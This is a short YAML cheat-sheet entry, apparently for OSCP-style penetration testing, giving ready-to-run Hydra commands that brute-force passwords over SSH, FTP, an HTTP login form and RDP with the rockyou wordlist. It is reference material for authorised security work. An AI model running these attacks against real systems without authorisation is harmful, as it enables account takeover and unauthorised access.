---
variants:
  - label: ssh
    command: |
      hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://$IP
  - label: ftp
    command: |
      hydra -l $USER -P /usr/share/wordlists/rockyou.txt ftp://$IP
  - label: http-post-form
    command: |
      hydra -l $USER -P /usr/share/wordlists/rockyou.txt $IP http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"
  - label: rdp
    command: |
      hydra -l $USER -P /usr/share/wordlists/rockyou.txt rdp://$IP
description: Online password brute forcer, by service, for SSH, FTP, HTTP forms, and RDP
os: [Linux]
category: [oscp, cli]
service: [SSH, FTP, HTTP, RDP]
phase: [CredAccess]
references:
  - https://www.kali.org/tools/hydra/
---
